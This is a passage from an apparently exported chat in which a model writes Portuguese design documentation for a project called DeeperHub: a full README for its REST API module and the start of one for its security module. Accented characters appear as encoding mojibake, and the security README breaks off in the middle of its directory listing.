O m√≥dulo `DeeperHub.API` √© respons√°vel por definir, gerenciar e proteger a Interface de Programa√ß√£o de Aplicativos (API) RESTful do sistema DeeperHub. Ele serve como o principal ponto de intera√ß√£o para clientes externos (aplica√ß√µes web, mobile, servi√ßos de terceiros) consumirem as funcionalidades e dados do DeeperHub.

Este m√≥dulo foca em fornecer uma API robusta, segura, versionada e bem documentada, incluindo mecanismos para limita√ß√£o de taxa (Rate Limiting) e valida√ß√£o de requisi√ß√µes. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Defini√ß√£o de Endpoints RESTful:**
    *   Mapeamento de rotas HTTP para controllers e a√ß√µes espec√≠ficas.
    *   Suporte aos verbos HTTP padr√£o (GET, POST, PUT, PATCH, DELETE).
*   **Valida√ß√£o de Requisi√ß√µes:**
    *   Valida√ß√£o de par√¢metros de query, path e corpo da requisi√ß√£o (via `DeeperHub.API.Validation.APIRequestValidator`).
    *   Valida√ß√£o de tipos de dados, formatos e regras de neg√≥cio.
*   **Limita√ß√£o de Taxa (Rate Limiting):**
    *   Controle do n√∫mero de requisi√ß√µes por cliente/IP/token em um determinado per√≠odo (via `DeeperHub.API.RateLimit.RateLimiterFacade` e `DeeperHub.API.RateLimiter` Plug).
    *   Preven√ß√£o de abusos e sobrecarga da API.
    *   Retorno de cabe√ßalhos HTTP padr√£o para rate limiting (ex: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`).
*   **Autentica√ß√£o e Autoriza√ß√£o de API (Delega√ß√£o):**
    *   Integrar com `DeeperHub.Auth` para autenticar requisi√ß√µes (ex: via tokens de API, JWTs de sess√£o).
    *   Verificar se o cliente autenticado tem permiss√£o para acessar o recurso/endpoint solicitado.
*   **Versionamento da API:**
    *   Suporte a diferentes vers√µes da API para permitir evolu√ß√£o sem quebrar clientes existentes (ex: `/api/v1/...`, `/api/v2/...`).
*   **Formata√ß√£o de Respostas:**
    *   Utilizar `DeeperHub.Core.APIResponder` para padronizar o formato das respostas JSON (sucesso, erro, valida√ß√£o).
*   **Documenta√ß√£o da API:**
    *   Facilitar a gera√ß√£o de documenta√ß√£o interativa (ex: OpenAPI/Swagger) a partir das defini√ß√µes de endpoint e schemas de valida√ß√£o.
*   **Tratamento de Erros da API:**
    *   Converter erros internos e de valida√ß√£o em respostas HTTP apropriadas e padronizadas.
*   **Gerenciamento de CORS (Cross-Origin Resource Sharing):**
    *   Configurar pol√≠ticas de CORS para permitir ou restringir acesso de diferentes origens.
*   **Caching de Respostas (Opcional):**
    *   Integrar com `DeeperHub.Core.Cache` para armazenar em cache respostas de endpoints frequentemente acessados e com dados pouco vol√°teis.

## üèóÔ∏è 3. Arquitetura e Design

O m√≥dulo `DeeperHub.API` normalmente reside na camada de interface do sistema, interagindo com os m√≥dulos de dom√≠nio (como `DeeperHub.Accounts`, `DeeperHub.Servers`, etc.) para processar requisi√ß√µes e com os m√≥dulos Core para funcionalidades transversais.

### 3.1. Componentes Principais

1.  **Router (ex: `DeeperHubWeb.Router` se usando Phoenix):**
    *   **Responsabilidade:** Define as rotas da API, mapeando URLs e m√©todos HTTP para os respectivos `Controllers`.
    *   **Intera√ß√µes:** Aplica Plugs de middleware para autentica√ß√£o, rate limiting, valida√ß√£o, etc.
2.  **Controllers (ex: `DeeperHubWeb.API.V1.UserController`):**
    *   **Responsabilidade:** Receber requisi√ß√µes HTTP, extrair par√¢metros, chamar os m√≥dulos de servi√ßo/fachadas de dom√≠nio apropriados, e formatar a resposta.
    *   **Intera√ß√µes:**
        *   Utiliza `DeeperHub.Core.APIResponder` para formatar respostas.
        *   Chama fachadas de dom√≠nio (ex: `DeeperHub.Accounts.get_user/1`).
        *   Pode interagir com `DeeperHub.Auth.authorize/4` para verifica√ß√µes de permiss√£o finas.
3.  **Plugs (Middleware):**
    *   **`DeeperHub.API.RateLimiter`:** Plug para aplicar limita√ß√£o de taxa antes de atingir o controller.
    *   **`DeeperHub.API.Validation.APIRequestValidator`:** Plug para validar par√¢metros da requisi√ß√£o contra um schema.
    *   **Plugs de Autentica√ß√£o:** Para verificar tokens e carregar o usu√°rio/cliente autenticado.
    *   **Plug de CORS:** Para gerenciar cabe√ßalhos CORS.
    *   **Plug de Logging de Requisi√ß√£o:** (ex: `DeeperHub.Logger.PhoenixIntegration.RequestLogger`) para logar detalhes de cada requisi√ß√£o.
4.  **`DeeperHub.API.RateLimit.RateLimiterFacade` e `DeeperHub.API.RateLimit.Registry`:**
    *   **Responsabilidade:** Fornecem a l√≥gica de neg√≥cio e o estado para o sistema de rate limiting.
    *   **Intera√ß√µes:** Utilizados pelo Plug `DeeperHub.API.RateLimiter`.
5.  **`DeeperHub.API.Validation.APIRequestValidator`:**
    *   **Responsabilidade:** Fornece a l√≥gica para valida√ß√£o de schemas de requisi√ß√£o.
    *   **Intera√ß√µes:** Utilizado como Plug ou diretamente pelos controllers.
6.  **Schemas de Valida√ß√£o (ex: em `DeeperHub.API.Validation.Schemas`):**
    *   **Responsabilidade:** Definir a estrutura esperada e as regras de valida√ß√£o para os dados de entrada de cada endpoint. Podem ser baseados em Ecto Changesets ou bibliotecas como `Params`.

### 3.2. Estrutura de Diret√≥rios (Proposta com Phoenix)

```
lib/deeper_hub_web/ # (Se usando Phoenix)
‚îú‚îÄ‚îÄ api/
‚îÇ   ‚îú‚îÄ‚îÄ v1/ # Para versionamento
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ user_controller.ex
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ server_controller.ex
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ ... (outros controllers da v1)
‚îÇ   ‚îÇ
‚îÇ   ‚îî‚îÄ‚îÄ v2/ # Futura vers√£o
‚îÇ       ‚îî‚îÄ‚îÄ ...
‚îÇ
‚îú‚îÄ‚îÄ plugs/
‚îÇ   ‚îú‚îÄ‚îÄ auth_api_token_plug.ex
‚îÇ   ‚îî‚îÄ‚îÄ ... (outros plugs customizados para a API)
‚îÇ
‚îî‚îÄ‚îÄ router.ex # Define os pipelines e escopos da API

lib/deeper_hub/api/ # L√≥gica de neg√≥cio da API, independente do Phoenix
‚îú‚îÄ‚îÄ rate_limit/
‚îÇ   ‚îú‚îÄ‚îÄ rate_limiter_facade.ex
‚îÇ   ‚îú‚îÄ‚îÄ registry.ex
‚îÇ   ‚îî‚îÄ‚îÄ supervisor.ex
‚îÇ
‚îú‚îÄ‚îÄ validation/
‚îÇ   ‚îú‚îÄ‚îÄ api_request_validator.ex
‚îÇ   ‚îî‚îÄ‚îÄ schemas/
‚îÇ       ‚îú‚îÄ‚îÄ user_schemas.ex
‚îÇ       ‚îî‚îÄ‚îÄ ...
‚îÇ
‚îú‚îÄ‚îÄ rate_limiter.ex # Plug de Rate Limit (se n√£o estiver em _web)
‚îî‚îÄ‚îÄ supervisor.ex   # Supervisor para os GenServers de RateLimit
```

### 3.3. Decis√µes de Design Importantes

*   **Stateless API:** A API deve ser o mais stateless poss√≠vel, com o estado do cliente gerenciado por tokens.
*   **Versionamento:** O versionamento da API (ex: no path `/api/v1/`) √© crucial para permitir atualiza√ß√µes e novas funcionalidades sem quebrar integra√ß√µes existentes.
*   **Valida√ß√£o na Entrada:** Todas as entradas devem ser rigorosamente validadas o mais cedo poss√≠vel no ciclo da requisi√ß√£o para garantir a integridade dos dados e proteger contra payloads maliciosos.
*   **Padroniza√ß√£o de Respostas:** Usar um formato consistente para todas as respostas (sucesso e erro) melhora a experi√™ncia do desenvolvedor que consome a API.
*   **Seguran√ßa como Prioridade:** Autentica√ß√£o, autoriza√ß√£o, rate limiting e outras medidas de seguran√ßa devem ser aplicadas de forma robusta.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Cliente Web Obt√©m Lista de Servidores:**
    *   O frontend envia um `GET /api/v1/servers?tag=pvp&page=2`.
    *   A requisi√ß√£o passa por Plugs de autentica√ß√£o (opcional), rate limiting.
    *   `ServerController.index/2` √© chamado.
    *   O controller valida os par√¢metros de query.
    *   Chama `DeeperHub.Servers.list_servers(%{tag: \"pvp\", page: 2})`.
    *   Formata a resposta usando `APIResponder.format_success/3` e retorna JSON.
*   **Aplicativo Mobile Cria um Novo Usu√°rio:**
    *   O app envia `POST /api/v1/users` com dados do usu√°rio no corpo.
    *   Plugs de rate limiting e `APIRequestValidator` (para o corpo) s√£o executados.
    *   `UserController.create/2` √© chamado.
    *   Chama `DeeperHub.Accounts.register_user(params)`.
    *   Retorna uma resposta de sucesso (201 Created) ou erro de valida√ß√£o (422).
*   **Servi√ßo Externo Atualiza Status (com Token de API):**
    *   Servi√ßo envia `PUT /api/v1/services/{service_id}/status` com header `Authorization: Bearer <api_token>`.
    *   Plug de autentica√ß√£o de API valida o token.
    *   Rate limiting espec√≠fico para tokens de API √© aplicado.
    *   Controller apropriado verifica permiss√µes do token e atualiza o status.

## üåä 5. Fluxos Importantes

### Fluxo de uma Requisi√ß√£o API T√≠pica (com Phoenix)

1.  **Requisi√ß√£o HTTP:** Cliente envia requisi√ß√£o (ex: `GET /api/v1/me`).
2.  **Endpoint Phoenix:** Recebe a requisi√ß√£o.
3.  **Pipeline de Plugs (definido no Router):**
    *   `Plug.Telemetry`: Inicia telemetria da requisi√ß√£o.
    *   `Plug.Parsers`: Parseia o corpo da requisi√ß√£o (se houver).
    *   `MyAppWeb.Plugs.AuthApiTokenPlug` (ou similar): Verifica o token de autentica√ß√£o no header, carrega `current_user_id` ou `current_client_id`. Se falhar, pode retornar 401.
    *   `DeeperHub.API.RateLimiter`: Verifica se a requisi√ß√£o excede os limites de taxa. Se sim, retorna 429.
    *   `DeeperHub.API.Validation.APIRequestValidator` (se configurado para a rota): Valida par√¢metros de query/corpo. Se falhar, retorna 422.
    *   Outros plugs (CORS, etc.).
4.  **Router Phoenix:** Direciona a requisi√ß√£o para o Controller e A√ß√£o apropriados (ex: `UserController.show_me/2`).
5.  **Controller (`UserController.show_me/2`):**
    *   Obt√©m `current_user_id` da `conn.assigns`.
    *   Chama o servi√ßo de dom√≠nio: `DeeperHub.Accounts.get_user(current_user_id)`.
    *   Recebe a resposta do servi√ßo (`{:ok, user}` ou `{:error, reason}`).
    *   Usa `DeeperHub.Core.APIResponder` para formatar a resposta JSON.
        *   Ex: `APIResponder.format_success(user_data_map)` ou `APIResponder.format_error(reason)`.
    *   Envia a resposta para o cliente com o status HTTP apropriado (ex: `json(conn, formated_response)`).
6.  **Plug.Telemetry (Sa√≠da):** Finaliza a telemetria da requisi√ß√£o.

## üì° 6. API (Endpoints RESTful)

Esta se√ß√£o deve detalhar os principais endpoints da API. Dada a natureza gen√©rica deste m√≥dulo, os endpoints espec√≠ficos seriam definidos pelos m√≥dulos de dom√≠nio que exp√µem funcionalidades via API. No entanto, o m√≥dulo `API` define *como* esses endpoints s√£o estruturados e protegidos.

**Exemplo de Defini√ß√£o de um Grupo de Endpoints (conceptual):**

### `GET /api/v1/users/{user_id}`

*   **Descri√ß√£o:** Retorna os detalhes de um usu√°rio espec√≠fico.
*   **Autentica√ß√£o:** Requer token de acesso v√°lido (sess√£o ou API).
*   **Autoriza√ß√£o:** O usu√°rio solicitante deve ter permiss√£o para ver o perfil do `user_id` (ex: ser o pr√≥prio usu√°rio ou um administrador).
*   **Par√¢metros de Caminho:**
    *   `user_id` (string, UUID): ID do usu√°rio a ser buscado.
*   **Resposta de Sucesso (200 OK):**
    ```json
    {
      \"status\": \"success\",
      \"data\": {
        \"id\": \"uuid-user-123\",
        \"email\": \"user@example.com\", // Pode ser omitido dependendo das permiss√µes
        \"profile\": {
          \"full_name\": \"John Doe\",
          \"bio\": \"Developer\"
        }
      },
      \"message\": null,
      \"meta\": null
    }
    ```
*   **Respostas de Erro:**
    *   `401 Unauthorized`: Token inv√°lido ou ausente.
    *   `403 Forbidden`: Usu√°rio autenticado n√£o tem permiss√£o.
    *   `404 Not Found`: Usu√°rio n√£o encontrado.
    *   `429 Too Many Requests`: Limite de taxa excedido.

*(Esta se√ß√£o seria populada com os endpoints reais √† medida que s√£o definidos).*

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   **Rate Limiting (prefixo: `[:api, :rate_limit, <endpoint_key>]`):**
    *   `... :limit` (Integer): N√∫mero m√°ximo de requisi√ß√µes.
    *   `... :window_seconds` (Integer): Janela de tempo em segundos.
    *   `... :block_seconds` (Integer): Dura√ß√£o do bloqueio ap√≥s exceder o limite.
    *   Exemplo: `[:api, :rate_limit, :users_index, :limit] = 100`
*   **Valida√ß√£o (geralmente por schema, n√£o globalmente no ConfigManager para APIRequestValidator):**
    *   `[:api, :validation, :strict_mode_enabled]` (Boolean): Se `APIRequestValidator` deve rejeitar campos desconhecidos. (Padr√£o: `true`)
*   **Versionamento:**
    *   `[:api, :default_version]` (String): Vers√£o padr√£o da API se nenhuma for especificada (ex: `\"v1\"`).
    *   `[:api, :supported_versions]` (List de Strings): Lista de vers√µes da API atualmente suportadas.
*   **CORS:**
    *   `[:api, :cors, :origins]` (List de Strings ou Regex): Origens permitidas.
    *   `[:api, :cors, :methods]` (List de Strings): M√©todos HTTP permitidos.
    *   `[:api, :cors, :headers]` (List de Strings): Cabe√ßalhos permitidos.
*   **Documenta√ß√£o:**
    *   `[:api, :docs, :openapi_spec_path]` (String): Caminho para o arquivo de especifica√ß√£o OpenAPI.
    *   `[:api, :docs, :ui_enabled]` (Boolean): Habilita a UI do Swagger/OpenAPI.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes de rate limiting, versionamento, etc.
*   `DeeperHub.Core.APIResponder`: Para padronizar respostas.
*   `DeeperHub.Core.Logger`: Para logging de requisi√ß√µes e erros.
*   `DeeperHub.Core.Metrics`: Para m√©tricas de API (lat√™ncia, taxa de erro, etc.).
*   `DeeperHub.Auth`: Para autentica√ß√£o e autoriza√ß√£o de requisi√ß√µes.
*   M√≥dulos de dom√≠nio (ex: `DeeperHub.Accounts`, `DeeperHub.Servers`): Para acessar a l√≥gica de neg√≥cio.

### 8.2. Bibliotecas Externas

*   `Phoenix` (se for o framework web): Para routing, controllers, plugs.
*   `Jason`: Para manipula√ß√£o de JSON.
*   `Plug` (Elixir): Para a arquitetura de middleware.
*   Bibliotecas de valida√ß√£o de par√¢metros (ex: `Params`, `Ecto.Changeset` para valida√ß√£o de corpo).
*   Bibliotecas de OpenAPI/Swagger para gera√ß√£o de documenta√ß√£o (ex: `OpenApiSpex`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Consumidores da API:** Devem seguir a documenta√ß√£o da API (idealmente gerada por OpenAPI) para entender os endpoints, formatos de requisi√ß√£o/resposta e autentica√ß√£o.
*   **Desenvolvedores do DeeperHub:**
    *   Ao adicionar novos endpoints, definir rotas no Router.
    *   Criar Controllers para lidar com a l√≥gica da requisi√ß√£o.
    *   Definir schemas de valida√ß√£o para os dados de entrada usando `DeeperHub.API.Validation.APIRequestValidator` ou similar.
    *   Configurar regras de rate limiting para os novos endpoints em `DeeperHub.API.RateLimiter`.
    *   Utilizar `DeeperHub.Core.APIResponder` para formatar todas as respostas.
    *   Integrar com `DeeperHub.Auth` para proteger os endpoints.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   **Testes de Integra√ß√£o/Controlador:** Para cada endpoint, testar:
    *   Respostas de sucesso (2xx).
    *   Erros de valida√ß√£o de entrada (422).
    *   Erros de autentica√ß√£o (401).
    *   Erros de autoriza√ß√£o (403).
    *   Recurso n√£o encontrado (404).
    *   Rate limiting (429).
    *   Formato correto da resposta JSON.
*   **Testes de Plugs:** Testes unit√°rios para plugs customizados (rate limiter, validador).
*   Localiza√ß√£o: `test/deeper_hub_web/api/v1/` (para controllers), `test/deeper_hub/api/` (para l√≥gica de neg√≥cio da API).

### 10.2. M√©tricas

*   `deeper_hub.api.http.requests.total` (Contador, tags: `path`, `method`, `status_code`): N√∫mero total de requisi√ß√µes.
*   `deeper_hub.api.http.requests.duration_ms` (Histograma, tags: `path`, `method`): Lat√™ncia das requisi√ß√µes.
*   `deeper_hub.api.rate_limit.throttled.count` (Contador, tags: `path`, `client_id`): N√∫mero de requisi√ß√µes bloqueadas por rate limiting.
*   `deeper_hub.api.validation.errors.count` (Contador, tags: `path`, `field`): N√∫mero de erros de valida√ß√£o.

### 10.3. Logs

*   Cada requisi√ß√£o HTTP deve ser logada (via `RequestLogger`), incluindo m√©todo, path, status code, dura√ß√£o, IP do cliente, user_id (se autenticado).
*   Erros de valida√ß√£o e exce√ß√µes nos controllers devem ser logados com detalhes.

### 10.4. Telemetria

Phoenix j√° emite muitos eventos de telemetria para o ciclo de vida da requisi√ß√£o. O m√≥dulo `API` pode adicionar eventos espec√≠ficos:
*   `[:deeper_hub, :api, :rate_limit, :exceeded]`
    *   Metadados: `%{path: path, client_id: id, limit: limit, window: window}`
*   `[:deeper_hub, :api, :validation, :failed]`
    *   Metadados: `%{path: path, errors: errors_map}`

## ‚ùå 11. Tratamento de Erros

*   Utilizar `DeeperHub.Core.APIResponder` para garantir que todas as respostas de erro sigam um formato padronizado (ex: JSON:API error objects).
*   Mapear exce√ß√µes comuns (ex: `Ecto.NoResultsError` para 404, erros de autoriza√ß√£o para 403) para os status HTTP corretos.
*   Evitar vazar detalhes internos do sistema (stack traces) em respostas de erro para o cliente em ambiente de produ√ß√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Autentica√ß√£o e Autoriza√ß√£o:** Todos os endpoints (exceto os explicitamente p√∫blicos) devem ser protegidos.
*   **Valida√ß√£o de Entrada:** Validar *todos* os dados provenientes do cliente.
*   **Rate Limiting:** Essencial para prevenir abuso.
*   **Sanitiza√ß√£o de Sa√≠da:** Embora geralmente o `APIResponder` lide com JSON, garantir que nenhum dado sens√≠vel ou script seja inadvertidamente inclu√≠do em respostas.
*   **Seguran√ßa de Cabe√ßalhos:** Usar cabe√ßalhos de seguran√ßa HTTP apropriados (CSP, HSTS, X-Frame-Options, etc.), geralmente configurados no n√≠vel do endpoint web.
*   **Prote√ß√£o contra Ataques Comuns:** CSRF (para APIs baseadas em sess√£o/cookie), XSS (se a API retorna HTML ou permite upload de conte√∫do que √© renderizado), Inje√ß√£o de SQL (prevenindo na camada de servi√ßo/dados).
*   **Gerenciamento de Tokens de API:** Tokens de API devem ser tratados como segredos, ter escopos limitados e permitir revoga√ß√£o.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novos endpoints, siga o padr√£o RESTful.
*   Documente os endpoints usando o padr√£o OpenAPI/Swagger.
*   Adicione schemas de valida√ß√£o para todas as novas requisi√ß√µes.
*   Configure regras de rate limiting apropriadas.
*   Escreva testes de integra√ß√£o abrangentes.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de quotas de API mais granular (al√©m do rate limiting b√°sico).
*   [ ] Adicionar suporte para WebSockets ou Server-Sent Events (SSE) para comunica√ß√£o em tempo real, se necess√°rio.
*   [ ] Melhorar a gera√ß√£o autom√°tica de documenta√ß√£o OpenAPI a partir do c√≥digo.
*   [ ] Integrar com um API Gateway para gerenciamento mais avan√ßado (ex: Kong, Tyk).
*   [ ] Adicionar suporte para negocia√ß√£o de conte√∫do (ex: `Accept` header para diferentes formatos de resposta, embora JSON seja o principal).
*   [ ] Implementar caching de respostas HTTP (ETags, Cache-Control) para endpoints apropriados.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este README para o `DeeperHub.API` tenta cobrir os aspectos de defini√ß√£o, prote√ß√£o e gerenciamento da API.

Qual o pr√≥ximo m√≥dulo? `DeeperHub.Security` seria uma boa continua√ß√£o, dado que muitos aspectos da API dependem dele."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos agora mergulhar no `DeeperHub.Security`, um m√≥dulo guarda-chuva que coordena diversas funcionalidades de seguran√ßa cruciais para a robustez do DeeperHub.

---

# M√≥dulo: `DeeperHub.Security` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security`

O m√≥dulo `DeeperHub.Security` √© a fachada principal e o ponto de coordena√ß√£o para todas as funcionalidades de seguran√ßa proativa e reativa no sistema DeeperHub. Ele n√£o implementa diretamente todas as l√≥gicas de seguran√ßa, mas delega e orquestra um conjunto de subm√≥dulos e servi√ßos especializados para proteger a aplica√ß√£o contra uma variedade de amea√ßas, gerenciar riscos e garantir a integridade e confidencialidade dos dados.

Este m√≥dulo abrange desde a prote√ß√£o contra ataques comuns (XSS, CSRF, Inje√ß√£o de SQL, DDoS, For√ßa Bruta) at√© mecanismos mais avan√ßados como detec√ß√£o de fraude, an√°lise comportamental, criptografia e gerenciamento de dispositivos e localiza√ß√µes seguras. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

O `DeeperHub.Security` atua principalmente como uma **fachada de alto n√≠vel**, delegando para os seguintes subm√≥dulos (que podem ter suas pr√≥prias fachadas e servi√ßos):

*   **`DeeperHub.Security.FraudDetection`:**
    *   An√°lise de transa√ß√µes, logins, mudan√ßas de perfil e uso de API para detectar fraudes.
    *   Gerenciamento de regras de detec√ß√£o e pontua√ß√£o de risco de fraude.
*   **`DeeperHub.Security.BruteForceProtection`:**
    *   Monitoramento e bloqueio de tentativas excessivas de acesso (ex: login, recupera√ß√£o de senha).
    *   Requisi√ß√£o de CAPTCHA.
*   **`DeeperHub.Security.CsrfProtection`:**
    *   Gera√ß√£o e valida√ß√£o de tokens CSRF para proteger contra ataques de falsifica√ß√£o de solicita√ß√£o entre sites.
*   **`DeeperHub.Security.DdosProtection`:**
    *   Mitiga√ß√£o de ataques de Nega√ß√£o de Servi√ßo Distribu√≠da atrav√©s de limita√ß√£o de taxa e bloqueio de IPs.
*   **`DeeperHub.Security.SqlInjectionProtection`:**
    *   Verifica√ß√£o e sanitiza√ß√£o de entradas para prevenir ataques de Inje√ß√£o de SQL.
*   **`DeeperHub.Security.XssProtection`:**
    *   Verifica√ß√£o e sanitiza√ß√£o de entradas e sa√≠das para prevenir ataques de Cross-Site Scripting.
*   **`DeeperHub.Security.PathTraversalProtection`:**
    *   Preven√ß√£o de acesso n√£o autorizado a arquivos e diret√≥rios.
*   **`DeeperHub.Security.RiskAssessment`:**
    *   Avalia√ß√£o de risco para diversas opera√ß√µes e contextos.
    *   C√°lculo de pontua√ß√µes de risco e recomenda√ß√£o de a√ß√µes.
*   **`DeeperHub.Security.BehavioralAnalysis`:**
    *   An√°lise do comportamento do usu√°rio para detectar anomalias e desvios.
    *   Cria√ß√£o e manuten√ß√£o de perfis comportamentais.
*   **`DeeperHub.Security.DeviceFingerprint` & `DeviceService` (parte de `SecurityManager` ou subm√≥dulo pr√≥prio):**
    *   Gerenciamento de dispositivos confi√°veis e bloqueados.
    *   Gera√ß√£o e compara√ß√£o de \"fingerprints\" de dispositivos.
*   **`DeeperHub.Security.GeoLocationService` (ou `LoginLocation`):**
    *   Verifica√ß√£o de localiza√ß√£o de login, detec√ß√£o de viagens imposs√≠veis.
*   **`DeeperHub.Security.AtRestEncryptionService` (usando `Core.EncryptionService`):**
    *   Garantir que dados sens√≠veis sejam criptografados em repouso.
*   **`DeeperHub.Security.LogSanitizer` & `ResponseSanitizer`:**
    *   Remo√ß√£o/mascaramento de dados sens√≠veis de logs e respostas de API.
*   **`DeeperHub.Security.AdminAuth` (se distinto de `DeeperHub.Auth` para admin):**
    *   Autentica√ß√£o e autoriza√ß√£o espec√≠ficas para a interface de administra√ß√£o.
*   **`DeeperHub.Security.Policy.SecurityPolicyManager`:**
    *   Gerenciamento centralizado de todas as pol√≠ticas de seguran√ßa com controle de acesso RBAC.
*   **Monitoramento e Alertas de Seguran√ßa (via `DeeperHub.Security.Monitoring`):**
    *   Registro de eventos de seguran√ßa e gera√ß√£o de alertas.

**Funcionalidades Coordenadas pela Fachada `DeeperHub.Security`:**

*   Fornecer um ponto de entrada para verifica√ß√µes de seguran√ßa gerais (ex: `DeeperHub.Security.is_request_safe?(conn)`).
*   Orquestrar m√∫ltiplas verifica√ß√µes de seguran√ßa para uma determinada opera√ß√£o.
*   Consolidar e reportar o estado de seguran√ßa geral do sistema.
*   Gerenciar a inicializa√ß√£o e configura√ß√£o dos subm√≥dulos de seguran√ßa.

## üèóÔ∏è 3. Arquitetura e Design

O `DeeperHub.Security` √© projetado como um m√≥dulo coordenador. Sua principal fun√ß√£o √© delegar para os m√≥dulos especializados.

### 3.1. Componentes Principais

*   **`DeeperHub.Security` (Fachada P√∫blica):** Ponto de entrada.
*   **Subm√≥dulos Especializados:** Como listados acima (`FraudDetection`, `BruteForceProtection`, etc.). Cada um destes ter√° sua pr√≥pria arquitetura interna (fachadas, servi√ßos, workers, schemas).
*   **`DeeperHub.Security.SecurityManager` (GenServer ou Servi√ßo Coordenador):**
    *   Pode ser o componente que a fachada `DeeperHub.Security` realmente chama.
    *   Respons√°vel por orquestrar chamadas para m√∫ltiplos subm√≥dulos de seguran√ßa quando uma avalia√ß√£o de seguran√ßa abrangente √© necess√°ria.
    *   Pode manter um estado agregado sobre a postura de seguran√ßa do sistema.
*   **`DeeperHub.Security.Policy.SecurityPolicyManager`:**
    *   Servi√ßo central para definir e aplicar todas as pol√≠ticas de seguran√ßa (ex: quando bloquear um IP, qual o threshold para fraude, etc.). Ele interage com o `Core.ConfigManager` mas fornece uma camada de abstra√ß√£o e valida√ß√£o espec√≠fica para pol√≠ticas de seguran√ßa.
*   **`DeeperHub.Security.Cache.SecurityCache`:**
    *   Cache para dados frequentemente acessados pelos m√≥dulos de seguran√ßa (IPs bloqueados, regras, etc.).
*   **`DeeperHub.Security.Integrations.EventIntegration`:**
    *   Publica eventos de seguran√ßa significativos (ex: `ip_blocked`, `fraud_detected`).
*   **`DeeperHub.Security.Integrations.AuditIntegration` (pode estar dentro de cada subm√≥dulo):**
    *   Registra a√ß√µes e detec√ß√µes de seguran√ßa no `DeeperHub.Audit`.
*   **`DeeperHub.Security.Supervisor` e `UnifiedSupervisor`:**
    *   Supervisionam todos os processos e workers dos subm√≥dulos de seguran√ßa.

### 3.2. Estrutura de Diret√≥rios (Alto N√≠vel)

```
lib/deeper_hub/security/
‚îú‚îÄ‚îÄ security.ex                       # Fachada P√∫blica do m√≥dulo Security
‚îú‚îÄ‚îÄ security_manager.ex               # Servi√ßo Coordenador
‚îÇ
‚îú‚îÄ‚îÄ admin_auth/                       # Autentica√ß√£o de Admin
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ behavioral_analysis/              # An√°lise Comportamental
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ brute_force_protection/           # Prote√ß√£o contra For√ßa Bruta
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ cache/                            # Cache espec√≠fico de Seguran√ßa
‚îÇ   ‚îú‚îÄ‚îÄ security_cache.ex
‚îÇ   ‚îî‚îÄ‚îÄ security_cache_supervisor.ex
‚îú‚îÄ‚îÄ config/                           # Configura√ß√µes espec√≠ficas de Seguran√ßa (ex: IPFirewallConfig)
‚îÇ   ‚îî‚îÄ‚îÄ ip_firewall_config.ex
‚îú‚îÄ‚îÄ csrf_protection/                  # Prote√ß√£o CSRF
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ data_masking/                     # Mascaramento de Dados
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ ddos_protection/                  # Prote√ß√£o DDoS
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ device_fingerprint.ex             # L√≥gica de Fingerprint de Dispositivo
‚îú‚îÄ‚îÄ device.ex                         # Schema de Dispositivo
‚îú‚îÄ‚îÄ fraud_detection/                  # Detec√ß√£o de Fraude
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ geo_location_service.ex           # Servi√ßo de Geolocaliza√ß√£o (se n√£o for m√≥dulo pr√≥prio)
‚îú‚îÄ‚îÄ hashing/                          # Hashing (se n√£o usar apenas Core.Encryption)
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ integrations/                     # Integra√ß√µes do m√≥dulo Security com outros sistemas
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ event_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ rbac_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ ... (RiskAuth, RiskFraud, RiskNotification)
‚îú‚îÄ‚îÄ intrusion_detection/              # Detec√ß√£o de Intrus√£o
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ log_sanitizer.ex                  # Saneador de Logs
‚îú‚îÄ‚îÄ monitoring/                       # Monitoramento de Seguran√ßa
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ path_traversal_protection/        # Prote√ß√£o contra Path Traversal
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ policy/                           # Gerenciamento de Pol√≠ticas de Seguran√ßa
‚îÇ   ‚îú‚îÄ‚îÄ security_policy_authorization.ex
‚îÇ   ‚îî‚îÄ‚îÄ security_policy_manager.ex
‚îú‚îÄ‚îÄ response_sanitizer.ex             # Saneador de Respostas
‚îú‚îÄ‚îÄ risk_assessment/                  # Avalia√ß√£o de Risco
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îú‚îÄ‚îÄ sql_injection_protection/         # Prote√ß√£o contra Inje√ß√£o SQL
